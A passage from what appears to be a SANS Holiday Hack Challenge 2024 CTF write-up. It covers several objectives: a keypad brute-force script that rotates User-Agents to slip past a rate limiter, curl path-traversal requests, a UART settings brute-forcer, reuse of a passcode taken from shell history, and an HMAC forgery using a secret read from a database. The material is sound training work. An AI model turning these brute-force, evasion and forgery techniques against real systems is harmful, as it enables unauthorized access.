AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15\",\n    \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\",\n    \"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\"\n]\n\nuser_agent_cycle = cycle(user_agents)\n\n# Iterate over each combination and send POST request\nfor answer in combinations:\n    # Randomize User-Agent header\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": next(user_agent_cycle)\n    }\n\n    payload = {\"answer\": answer}\n    response = requests.post(url, json=payload, headers=headers)\n\n    # Scrolling effect\n    print(f\"Testing number: {answer} | Last response: {response.status_code} - {response.text}\", end=\"\\r\")\n\n    # Check if the response status code is not 400\n    if response.status_code != 400:\n        print(f\"\\nSuccessful number: {answer}\")\n        print(f\"Response: {response.text}\")\n        break\n\n    # Short delay between requests\n    time.sleep(0.2)  # 200ms delay\n\nprint(\"\\nScript finished.\")\n</code></pre> <pre><code>matthew@kali:~/sans/HackHolidayChallenge# python3 brute_frosty_keypad.py \nTesting number: 26872 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 26678 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 76728 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 76287 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 28768 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 26887 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 86278 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 28627 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 26278 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 76828 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 72628 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 86726 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 82627 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 28678 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 72286 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 88762 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 68772 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 87266 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 28677 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 87862 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 82768 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 82786 | Last response: 400 - {\"error\":\"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!\"}\nTesting number: 22786 | Last response: 200 - {\"output\":\"success\"}\n\nSuccessful number: 22786\nResponse: {\"output\":\"success\"}\n\n\nScript finished.\n</code></pre>"},{"location":"objectives/o4/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>WOW, you did it! You know, they say Ottendorf ciphers were used back in the Frosty Archives crisis\u2026 or was that during the Jack Frost incident? Either way, you're amazing! Unbelievable! You found a flaw in the system and completely bypassed the rate limiter. You\u2019re practically an elf legend!</p> <p>Oh, and while you're at it, grab the Silver badge\u2014something about a cipher might come in handy for another challenge soon!</p> <p>Incredible work! You pieced together the code like a true sleuth and retrieved the shreds we need. I\u2019m not quite sure how you\u2019ll put them all together, but if anyone can, it\u2019s you!</p> <p>Your help has been absolutely essential, especially now with Santa missing. Wombley and Alabaster will want to hear all about it\u2014go share the news with Jewel Loggins!</p>"},{"location":"objectives/o5/","title":"cURLing","text":"<p>Difficulty:  Direct link: cURLing Terminal</p>"},{"location":"objectives/o5/#objective","title":"Objective","text":"<p>Request</p> <p>Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!</p> Morcel Nougat <p>Well hello there! I'm Bow Ninecandle, bright as a twinkling star! Everyone's busy unpacking, but I've grown quite bored of that. Care to join me for a lovely game?</p> <p>Oh Joy! Today, We're diving into something delightful: the curling challenge\u2014without any ice, but plenty of sparkle!</p> <p>No icy brooms here though! We're all about Curl, sending web requests from the command line like magic messages.</p> <p>So, have you ever wielded Curl before? If not, no worries at all, my friend!</p> <p>It's this clever little tool that lets you whisper directly to web servers. Pretty neat, right?</p> <p>Think of it like sending secret scrolls through the interwebs, awaiting a wise reply!</p> <p>To begin, you can type something like curl https://example.com. Voil\u00e0! The HTML of the page appears, like conjuring a spell!</p> <p>Simple enough, huh? But oh, there's a whole world of magic you can cast with Curl!</p> <p>We're just brushing the surface here, but trust me\u2014it\u2019s a hoot and a half!</p> <p>If you get tangled up or need help, just give me a shout! I\u2019m here to help you ace this curling spectacle.</p> <p>So, are you ready to curl those web requests like a pro? Let\u2019s see your magic unfold!</p>"},{"location":"objectives/o5/#hints","title":"Hints","text":"cURL: Don't squash <p>Take a look at cURL's \"--path-as-is\" option; it controls a default behavior that you may not expect!</p> cURL Manual <p>The official cURL man page has tons of useful information on how to use cURL.</p>"},{"location":"objectives/o5/#solution","title":"Solution","text":""},{"location":"objectives/o5/#easy-mode","title":"Easy Mode","text":"<p>This challenge is a terminal requesting ways of using curl.</p> <p>Welcome to Curling Fun!  We will learn some basic curl commands while playing a round of curling.</p> <p>Are you ready to begin?</p> <p>1) Unlike the defined standards of a curling sheet, embedded devices often have web servers on non-standard ports.  Use curl to retrieve the web page on host \"curlingfun\" port 8080.</p> <pre><code>alabaster@curlingfun:~$ curl http://curlingfun:8080\nYou have successfully accessed the site on port 8080!\n</code></pre> <p>2) Embedded devices often use self-signed certificates, where your browser will not trust the certificate presented.  Use curl to retrieve the TLS-protected web page at https://curlingfun:9090/</p> <pre><code>alabaster@curlingfun:~$ curl -k https://curlingfun:9090\nYou have successfully bypassed the self-signed certificate warning!\nSubsequent requests will continue to require \"--insecure\", or \"-k\" for short.\n</code></pre> <p>3) Working with APIs and embedded devices often requires making HTTP POST requests. Use curl to send a request to https://curlingfun:9090/ with the parameter \"skip\" set to the value \"alabaster\", declaring Alabaster as the team captain.</p> <pre><code>alabaster@curlingfun:~$ curl -k -X POST -d \"skip=alabaster\" https://curlingfun:9090\nYou have successfully made a POST request!\n</code></pre> <p>4) Working with APIs and embedded devices often requires maintaining session state by passing a cookie.  Use curl to send a request to https://curlingfun:9090/ with a cookie called \"end\" with the value \"3\", indicating we're on the third end of the curling match.</p> <pre><code>alabaster@curlingfun:~$ curl -k -b \"end=3\" https://curlingfun:9090\nYou have successfully set a cookie!\n</code></pre> <p>5) Working with APIs and embedded devices sometimes requires working with raw HTTP headers.  Use curl to view the HTTP headers returned by a request to https://curlingfun:9090/</p> <pre><code>alabaster@curlingfun:~$ curl -k https://curlingfun:9090 -i\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Fri, 15 Nov 2024 16:48:50 GMT\nContent-Type: text/plain;charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nCustom-Header: You have found the custom header!\n\nYou have successfully bypassed the self-signed certificate warning!\nSubsequent requests will continue to require \"--insecure\", or \"-k\" for short.\n</code></pre> <p>6) Working with APIs and embedded devices sometimes requires working with custom HTTP headers.  Use curl to send a request to https://curlingfun:9090/ with an HTTP header called\" \"Stone\" and the value \"Granite\".</p> <pre><code>alabaster@curlingfun:~$ curl -k -H \"Stone: Granite\" https://curlingfun:9090\nYou have successfully set a custom HTTP header!\n</code></pre> <p>7) curl will modify your URL unless you tell it not to.  For example, use curl to retrieve the following URL containing special characters: https://curlingfun:9090/../../etc/hacks</p> <pre><code>alabaster@curlingfun:~$ curl -k --path-as-is https://curlingfun:9090/../../etc/hacks\nYou have successfully utilized --path-as-is to send a raw path!\n</code></pre> <p>Success! We got the Silver Trophy</p> Morcel Nougat <p>Bravo! Look at you, curling through that like a true web wizard!</p> <p>You zipped through that challenge faster than a curling stone on enchanted ice!</p> <p>You know... rumor has it you can breeze through this with just three commands. Why don\u2019t you give it a whirl?</p>"},{"location":"objectives/o5/#hard-mode","title":"Hard Mode","text":"<p>In the terminal, if we do a directory listing, we can see a file called HARD-MODE.txt. Following is its contents</p> <p>Note</p> <pre><code>Prefer to skip ahead without guidance?  Use curl to craft a request meeting these requirements:\n\n- HTTP POST request to https://curlingfun:9090/\n- Parameter \"skip\" set to \"bow\"\n- Cookie \"end\" set to \"10\"\n- Header \"Hack\" set to \"12ft\"\n</code></pre> <pre><code>alabaster@curlingfun:~$ curl -k -X POST -d \"skip=bow\" -b \"end=10\" -H \"Hack: 12ft\" https://curlingfun:9090/\nExcellent!  Now, use curl to access this URL: https://curlingfun:9090/../../etc/button\nalabaster@curlingfun:~$ curl -k --path-as-is https://curlingfun:9090/../../etc/button\nGreat!  Finally, use curl to access the page that this URL redirects to: https://curlingfun:9090/GoodSportsmanship\nalabaster@curlingfun:~$ curl -k -L https://curlingfun:9090/GoodSportsmanship\nExcellent work, you have solved hard mode!  You may close this terminal once HHC grants your achievement.\n</code></pre> <p>Success! We got the Gold Trophy</p>"},{"location":"objectives/o5/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>Wait... did you just slice and dice it all into three commands? My stars, you're a Curling conjurer!</p>"},{"location":"objectives/o6-1/","title":"Hardware Hacking 101 Part 1","text":"<p>Difficulty:  Direct link: Santa Little Helper Access Card Maintenance Tool</p>"},{"location":"objectives/o6-1/#objective","title":"Objective","text":"<p>Request</p> <p>Jingle all the wires and connect to Santa's Little Helper to reveal the merry secrets locked in his chest!</p> Jewel Loggins <p>Hello there! I\u2019m Jewel Loggins.</p> <p>I hate to trouble you, but I really need some help. Santa\u2019s Little Helper tool isn\u2019t working, and normally, Santa takes care of this\u2026 but with him missing, it\u2019s all on me.</p> <p>I need to connect to the UART interface to get things running, but it\u2019s like the device just refuses to respond every time I try.</p> <p>I've got all the right tools, but I must be overlooking something important. I've seen a few elves with similar setups, but everyone\u2019s so busy preparing for Santa\u2019s absence.</p> <p>If you could guide me through the connection process, I\u2019d be beyond grateful. It\u2019s critical because this interface controls access to our North Pole access cards!</p> <p>We used to have a note with the serial settings, but apparently, one of Wombley\u2019s elves shredded it! You might want to check with Morcel Nougat\u2014he might have a way to recover it.</p>"},{"location":"objectives/o6-1/#hints","title":"Hints","text":"On the Cutting Edge <p>Hey, I just caught wind of this neat way to piece back shredded paper! It's a fancy heuristic detection technique\u2014sharp as an elf\u2019s wit, I tell ya! Got a sample Python script right here, courtesy of Arnydo. Check it out when you have a sec: heuristic_edge_detection.py.</p> Shredded to Pieces <p>Have you ever wondered how elves manage to dispose of their sensitive documents? Turns out, they use this fancy shredder that is quite the marvel of engineering. It slices, it dices, it makes the paper practically disintegrate into a thousand tiny pieces. Perhaps, just perhaps, we could reassemble the pieces?</p>"},{"location":"objectives/o6-1/#solution","title":"Solution","text":"<p>I am not sure which approach has granted me the Gold Trophy for this challenge, so I am not going to split this be Easy or Hard Mode, but by the methods I used.</p>"},{"location":"objectives/o6-1/#bruteforce-method","title":"Bruteforce Method","text":"<p>The challenge involves wiring up the Santa Little Helper Access Card Maintenance Tool to get access to it via serial console, which is connected to a terminal via USB. We need to connect the wires to the correct terminals, set the Voltage to 3V and then discover the serial settings to use. The physical connectivity is quite straight forward, just connect RX to TX, TX to RX, VCC to V(Volt) and GND to G(Ground). The trouble is finding the serial settings, which I guess could be done manually by trial and error, but I wasn't going to take that approach. Looking at the Network Tab in the browser Development Tools, I could see the request being sent to the API which was the following:</p> <pre><code>{requestID: \"50a92e5e-8ee3-4f27-9e99-bb341751efa0\", serial: [0, 0, 0, 0, 0, 0], voltage: 3}\n</code></pre> <p>The response to this was False. I thought that we could bruteforce this so I asked Chatty to build a script to do just that. While looking at the page source code further, I was able to see the following comment:</p> <p>Source Code Comment</p> <pre><code>// Word on the wire is that some resourceful elves managed to brute-force their way in through the v1 API.\n// We have since updated the API to v2 and v1 \"should\" be removed by now.// Build the URL with the request ID \n// const url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v1/complete`);\nconst url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v2/complete`);\n</code></pre> <p>I started the bruteforce script against api v2 first, which eventually returned \"True\". I also ran it a second time against v1. In both cases, it worked! </p> <p>Request was successful with serial: (3, 9, 2, 2, 0, 3)</p>"},{"location":"objectives/o6-1/#shreds-method","title":"Shreds Method","text":"<p>Besides the UV Flashlight and the Frosty Book which we picked up earlier in the challenges, we were also rewarded the shreds of an important file. Uncompressing this file reveals a large number of small JPEG files, wall named with a unique ID. The challenge provides a tip that if we use the heuristic edge detection script, we should be able to identify the order of these files to stitch them back together. But, in the process of my investigation, I identified that the JPEG files where compressed in the order they were shreded. One can see this using a tool like zipnote or zipinfo against the shreds. This could be tested using the EXIF tool against each of these files in the order identified by these tools, to reveal a base64 comment, that when decoded, returns an array of 2 string, the first whcih liiks like some encoding string, which I have not figured out what it is (so far), while the second array contained groups of 2 or 3 ASCII character. I asked Chatty to come up with a script that gets the order from the shreds file itself, and then run EXIF on each, decode the base64, and combine the ASCII String. This is the story we descoverd:</p> <p>Note</p> <p>Long ago, in the snowy realm of the North Pole (not too far away if you're a reindeer), there existed a magical land ruled by a mysterious figure known as the Great Claus. Two spirited elves, Twinkle and Jangle, roamed this frosty kingdom, defending it from the perils of holiday cheerlessness. Twinkle, sporting a bright red helmet-shaped hat that tilted just so, was quick-witted and even quicker with a snowball. Jangle, a bit taller, wore a green scarf that drooped like a sleepy reindeers ears. Together, they were the Mistletoe Knights, the protectors of the magical land and the keepers of Claus peace. One festive morning, the Great Claus summoned them for a critical quest. 'Twinkle, Jangle, the time has come,' he announced with a voice that rumbled like thunder across the ice plains. 'The fabled Never-Melting Snowflake, a relic that grants one wish, lies hidden beyond the Peppermint Expanse. Retrieve it, and all marshmallow supplies will be secured!' Armed with Jangles handmade map (created with crayon and a lot of optimism), the duo set off aboard their toboggan, the Frostwing. However, the map led them in endless loops around the Reindeer Academy, much to the amusement of trainee reindeer perfecting their aerial maneuvers. Blitzen eventually intercepted them, chuckling, 'Lost, fellas? The snowflake isnt here. Try the Enchanted Peppermint Grove!' Twinkle facepalmed as Jangle pretended to adjust his map. With Blitzens directions, they zoomed off again, this time on the right course. The Peppermint Grove was alive with its usual enchantmentscandy cane trees swayed and sang ancient ballads of epic sleigh battles and the triumphs of Claus candy cane squadrons. Twinkle and Jangle joined the peppermint choir, their voices harmonizing with the festive tune. Hours later, the duo stumbled upon a hidden cave guarded by giant gumdrop sentinels (luckily on their lunch break). Inside, the air shimmered with Claus magic. There it wasthe Never-Melting Snowflake, glistening on a pedestal of ice. Twinkles eyes widened, 'Weve found it, Jangle! The key to infinite marshmallows!' As Twinkle reached for the snowflake, a voice boomed from the cave walls, 'One wish, you have. Choose wisely or face the egg-nog of regret.' Without hesitation, Jangle exclaimed, 'An endless supply of marshmallows for our cocoa!' The snowflake glowed, and with a burst of magic, marshmallows poured down, covering the cave in a fluffy, sweet avalanche. Back at the workshop, the elves were hailed as heroesthe Marshmallow Knights of Claus. They spent the rest of the season crafting new cocoa recipes and sharing their bounty with all. And so, under the twinkling stars of the northern skies, Twinkle and Jangle continued their adventures, their mugs full of cocoa, their hearts full of joy, and their days full of magic. For in the North Pole, every quest was a chance for festive fun, and every snowflake was a promise of more marshmallows to come.</p> <p>I then asked Chatty to modify the script to use the same ordering process, but combine the JPEGs into one Image. The result was the note with the correct serial settings.</p> <p></p> <p>Success! We got the Gold Trophy</p>"},{"location":"objectives/o6-1/#images","title":"Images","text":""},{"location":"objectives/o6-1/#code-blocks","title":"Code blocks","text":"Bruteforce UARTSort Shreds and Return the StorySort Shreds and Combine in one Image <pre><code>import requests\nimport json\nimport itertools\n\ndef send_post_request():\n    url = \"https://hhc24-hardwarehacking.holidayhackchallenge.com/api/v2/complete\"\n    headers = {\n        \"Content-Type\": \"application/json\"\n    }\n\n    # Define ranges for serial values\n    serial_ranges = [\n        range(0, 4),  # 0-3\n        range(0, 10), # 0-9\n        range(0, 3),  # 0-2\n        range(0, 4),  # 0-3\n        range(0, 2),  # 0-1\n        range(0, 4)   # 0-3\n    ]\n\n    # Create all combinations of serial values using itertools.product\n    for serial in itertools.product(*serial_ranges):\n        data = {\n            \"requestID\": \"22fc5930-1882-4069-8079-e365c9a93547\",\n            \"serial\": list(serial),\n            \"voltage\": 3\n        }\n\n        try:\n            response = requests.post(url, headers=headers, data=json.dumps(data))\n\n            # Handle the response\n            if response.status_code == 200:\n                response_json = response.json()\n                if response_json is not False:\n                    print(\"Request was successful with serial:\", serial)\n                    print(\"Response:\", response_json)\n                    break\n                else:\n                    print(\"Attempt with serial\", serial, \"returned False\")\n            else:\n                print(f\"Failed with status code {response.status_code}: {response.text}\")\n        except requests.exceptions.RequestException as e:\n            print(\"An error occurred:\", e)\n\nif __name__ == \"__main__\":\n    send_post_request()\n</code></pre> <pre><code>import os\nimport zipfile\nimport base64\nimport subprocess\nimport ast\n\n# Path to your files\nzip_file = \"./shreds.zip\"\n\n# Get the list of files in the ZIP file, in the exact order they were compressed\ndef get_zip_file_list(zip_file):\n    with zipfile.ZipFile(zip_file, 'r') as zip_ref:\n        return zip_ref.namelist()\n\n# Extract the \"User Comment\" field from an image using exiftool\n# The \"User Comment\" is base64 encoded, so we need to decode it\n# Returns the decoded user comment\ndef get_user_comment(file_path):\n    try:\n        # Run exiftool to get the User Comment field\n        result = subprocess.run([\n            \"exiftool\", \"-UserComment\", file_path\n        ], capture_output=True, text=True)\n\n        if result.returncode == 0:\n            output = result.stdout\n            # Find the line containing \"User Comment\"\n            for line in output.splitlines():\n                if \"User Comment\" in line:\n                    # Extract the value after the colon\n                    comment = line.split(\":\", 1)[-1].strip()\n                    # Base64 decode the comment\n                    decoded_comment = base64.b64decode(comment).decode('utf-8')\n                    print(f\"Decoded User Comment for {file_path}: {decoded_comment}\")\n                    return decoded_comment\n    except Exception as e:\n        print(f\"Error extracting User Comment from {file_path}: {e}\")\n    return \"\"\n\n\ndef main():\n    # Get the list of files from the zip archive\n    file_list = get_zip_file_list(zip_file)\n\n    # Initialize empty strings to collect the \"cryptic\" and \"story\" parts\n    cryptic_result = \"\"\n    story_result = \"\"\n\n    for file_name in file_list:\n        # Skip files that are not .jpg\n        if not file_name.lower().endswith(\".jpg\"):\n            continue\n\n        # The file path is already correct as per the zip structure\n        file_path = file_name\n        if os.path.exists(file_path):\n            print(f\"Processing file: {file_path}\")\n            # Extract the user comment, decode it\n            decoded_comment = get_user_comment(file_path)\n            if decoded_comment:\n                try:\n                    # Convert the decoded comment string to a list\n                    comment_list = ast.literal_eval(decoded_comment)\n                    if isinstance(comment_list, list) and len(comment_list) == 2:\n                        cryptic_result += comment_list[0]\n                        story_result += comment_list[1]\n                    else:\n                        print(f\"Unexpected format for decoded comment in {file_path}: {decoded_comment}\")\n                except Exception as e:\n                    print(f\"Error parsing decoded comment for {file_path}: {e}\")\n        else:\n            print(f\"File {file_path} does not exist in extracted slices folder.\")\n\n    # Print the final concatenated results\n    print(\"Final Cryptic Result:\")\n    print(cryptic_result)\n    print(\"\\nFinal Story Result:\")\n    print(story_result)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <pre><code>import os\nimport zipfile\nfrom PIL import Image\n\n# Path to your files\nzip_file = \"./shreds.zip\"\noutput_file = \"./combined_output.jpg\"\n\n# Get the list of files in the ZIP file, in the exact order they were compressed\ndef get_zip_file_list(zip_file):\n    with zipfile.ZipFile(zip_file, 'r') as zip_ref:\n        return zip_ref.namelist()\n\ndef concatenate_images(image_paths):\n    images = [Image.open(image_path) for image_path in image_paths]\n\n    # Assuming all images are the same size, get dimensions\n    widths, heights = zip(*(i.size for i in images))\n    total_width = sum(widths)\n    max_height = max(heights)\n\n    # Create a new blank image with the correct total width and max height\n    combined_image = Image.new('RGB', (total_width, max_height))\n\n    # Paste each image side by side\n    x_offset = 0\n    for im in images:\n        combined_image.paste(im, (x_offset, 0))\n        x_offset += im.size[0]\n\n    return combined_image\n\ndef main():\n    # Get the list of files from the zip archive\n    file_list = get_zip_file_list(zip_file)\n\n    # Filter out non-jpg files\n    jpg_files = [file_name for file_name in file_list if file_name.lower().endswith(\".jpg\")]\n\n    # Extract jpg files from the zip archive\n    extracted_paths = []\n    with zipfile.ZipFile(zip_file, 'r') as zip_ref:\n        for file_name in jpg_files:\n            extracted_path = zip_ref.extract(file_name)\n            extracted_paths.append(extracted_path)\n\n    # Concatenate images\n    if extracted_paths:\n        combined_image = concatenate_images(extracted_paths)\n        combined_image.save(output_file)\n        print(f\"Combined image saved as {output_file}\")\n    else:\n        print(\"No JPG files found in the ZIP archive.\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"objectives/o6-1/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Fantastic! You managed to connect to the UART interface\u2014great work with those tricky wires! I couldn't figure it out myself\u2026</p> <p>Rumor has it you might be able to bypass the hardware altogether for the gold medal. Why not see if you can find that shortcut?</p>"},{"location":"objectives/o6-2/","title":"Hardware Hacking 101 Part 2","text":"<p>Difficulty:  Direct link: Santa Little Helper Terminal</p>"},{"location":"objectives/o6-2/#objective","title":"Objective","text":"<p>Request</p> <p>Santa\u2019s gone missing, and the only way to track him is by accessing the Wish List in his chest\u2014modify the access_cards database to gain entry!</p> Jewel Loggins <p>Next, we need to access the terminal and modify the access database. We're looking to grant access to card number 42.</p> <p>Start by using the slh application\u2014that\u2019s the key to getting into the access database. Problem is, the \u2018slh\u2019 tool is password-protected, so we need to find it first.</p> <p>Search the terminal thoroughly; passwords sometimes get left out in the open.</p> <p>Once you've found it, modify the entry for card number 42 to grant access. Sounds simple, right? Let\u2019s get to it!</p>"},{"location":"objectives/o6-2/#hints","title":"Hints","text":"It's In the Signature <p>I seem to remember there being a handy HMAC generator included in CyberChef){:target=\"_blank\"}.</p> Hidden in Plain Sight <p>It is so important to keep sensitive data like passwords secure. Often times, when typing passwords into a CLI (Command Line Interface) they get added to log files and other easy to access locations. It makes it trivial to step back in history and identify the password.</p>"},{"location":"objectives/o6-2/#solution","title":"Solution","text":""},{"location":"objectives/o6-2/#easy-mode","title":"Easy Mode","text":"<p>Once we start the terminal, we are presented with a U-Boot Boot Menu and we go with option 1: Startup system (Default). The terminal displays the help file for the SLH Tool.</p> <pre><code>--------------------------------------------------------\n                   ___     _      _  _   \n                  / __|   | |    | || |  \n                  \\__ \\   | |__  | __ |  \n                  |___/   |____| |_||_|  \n                _|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| \n                \"`-0-0-'\"`-0-0-'\"`-0-0-' \n--------------------------------------------------------\n  Santa's Little Helper - Access Card Maintenance Tool\n\n          Tool Name: slh\n\noptions:\n  -h, --help            show this help message and exit\n  --view-config         View current configuration.\n  --view-cards          View current values of all access cards.\n  --view-card ID        View a single access card by ID.\n  --set-access ACCESS_LEVEL\n                        Set access level of access card. Must be 0 (No Access) or 1 (Full Access).\n  --id ID               ID of card to modify.\n  --passcode PASSCODE   Passcode to make changes.\n  --new-card            Generate a new card ID.\n--------------------------------------------------------\n</code></pre> <p>Our task is to update the card 42 to grant it access level 1 (Full Access). The hint tells us to look at the history where many times, passwords are used as parameters in clear. Looking at the history, we see that on line 11, the command was used to updated card 143 to access level 1 as follows:</p> <pre><code>11  slh --passcode CandyCaneCrunch77 --set-access 1 --id 143\n</code></pre> <p>All we need to do to get the silver trophy is to run this command but with --id 42.</p> <pre><code>slh@slhconsole\\&gt; slh --passcode CandyCaneCrunch77 --set-access 1 --id 42 \n\n       *   *   *   *   *   *   *   *   *   *   *\n   *                                             *\n*      \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744     *\n *  $$$$$$\\   $$$$$$\\   $$$$$$\\  $$$$$$$$\\  $$$$$$\\   $$$$$$\\  * \n  * $$  __$$\\ $$  __$$\\ $$  __$$\\ $$  _____|$$  __$$\\ $$  __$$\\ *\n   *$$ /  $$ |$$ /  \\__|$$ /  \\__|$$ |      $$ /  \\__|$$ /  \\__| *\n    $$$$$$$$ |$$ |      $$ |      $$$$$\\    \\$$$$$$\\  \\$$$$$$\\   \n   *$$  __$$ |$$ |      $$ |      $$  __|    \\____$$\\  \\____$$\\  *\n  * $$ |  $$ |$$ |  $$\\ $$ |  $$\\ $$ |      $$\\   $$ |$$\\   $$ | *\n*   $$ |  $$ |\\$$$$$$  |\\$$$$$$  |$$$$$$$$\\ \\$$$$$$  |\\$$$$$$  |   *\n *  \\__|  \\__| \\______/  \\______/ \\________| \\______/  \\______/  *\n*         *    \u2744             \u2744           *        \u2744    \u2744    \u2744   *\n   *        *     *     *      *     *      *    *      *      *\n   *  $$$$$$\\  $$$$$$$\\   $$$$$$\\  $$\\   $$\\ $$$$$$$$\\ $$$$$$$$\\ $$$$$$$\\  $$\\  *\n   * $$  __$$\\ $$  __$$\\ $$  __$$\\ $$$\\  $$ |\\__$$  __|$$  _____|$$  __$$\\ $$ | *\n  *  $$ /  \\__|$$ |  $$ |$$ /  $$ |$$$$\\ $$ |   $$ |   $$ |      $$ |  $$ |$$ |*\n  *  $$ |$$$$\\ $$$$$$$  |$$$$$$$$ |$$ $$\\$$ |   $$ |   $$$$$\\    $$ |  $$ |$$ | *\n *   $$ |\\_$$ |$$  __$$&lt; $$  __$$ |$$ \\$$$$ |   $$ |   $$  __|   $$ |  $$ |\\__|*\n  *  $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\\$$$ |   $$ |   $$ |      $$ |  $$ |   *\n*    \\$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \\$$ |   $$ |   $$$$$$$$\\ $$$$$$$  |$$\\ *\n *    \\______/ \\__|  \\__|\\__|  \\__|\\__|  \\__|   \\__|   \\________|\\_______/ \\__|  *\n  *                                                            \u2744    \u2744    \u2744   *\n   *      *    *    *    *    *    *    *    *    *    *    *    *    *    *                                                                                                                                        \n\nCard 42 granted access level 1.\n</code></pre> Jewel Loggins <p>Wow! You're amazing at this! Clever move finding the password in the command history. It\u2019s a good reminder about keeping sensitive information secure\u2026</p> <p>There\u2019s a tougher route if you're up for the challenge to earn the Gold medal. It involves directly modifying the database and generating your own HMAC signature.</p> <p>I know you can do it\u2014come back once you've cracked it!</p>"},{"location":"objectives/o6-2/#hard-mode","title":"Hard Mode","text":"<p>Looking at the folder listing in the terminal we can see a file called access_cards. Using file against it, we can see it is an SQLite 3.x databsae.</p> <pre><code>slh@slhconsole\\&gt; ls\naccess_cards\nslh@slhconsole\\&gt; file access_cards \naccess_cards: SQLite 3.x database, last written using SQLite version 3040001, file counter 4, database pages 32, cookie 0x2, schema 4, UTF-8, version-valid-for 4\nslh@slhconsole\\&gt; \n</code></pre> <p>sqlite3 is readily available on this platform so we open the database with this tool. .schema reveals the Tables and their structures. Looking at the config table, we can see that the hmac_secret!</p> <p>9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e </p> <p>The hmac message formate is also provided as {access}{uuid}. </p> <p>So we launch the CyberChef){:target=\"_blank\"} and using the hmac secret from the database, we use the UUID of entry 42 as input, prepended with the access level (1) to generate the hash. Then we simply update the entry with this hash, and also set the access field to 1.</p> <pre><code>sqlite&gt; UPDATE access_cards\n   ...&gt; SET access = 1,\n   ...&gt; sig = '135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096'\n   ...&gt; WHERE id = 42;\nsqlite&gt; \n       *   *   *   *   *   *   *   *   *   *   *\n   *                                             *\n*      \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744  \u2744     *\n *  $$$$$$\\   $$$$$$\\   $$$$$$\\  $$$$$$$$\\  $$$$$$\\   $$$$$$\\  * \n  * $$  __$$\\ $$  __$$\\ $$  __$$\\ $$  _____|$$  __$$\\ $$  __$$\\ *\n   *$$ /  $$ |$$ /  \\__|$$ /  \\__|$$ |      $$ /  \\__|$$ /  \\__| *\n    $$$$$$$$ |$$ |      $$ |      $$$$$\\    \\$$$$$$\\  \\$$$$$$\\   \n   *$$  __$$ |$$ |      $$ |      $$  __|    \\____$$\\  \\____$$\\  *\n  * $$ |  $$ |$$ |  $$\\ $$ |  $$\\ $$ |      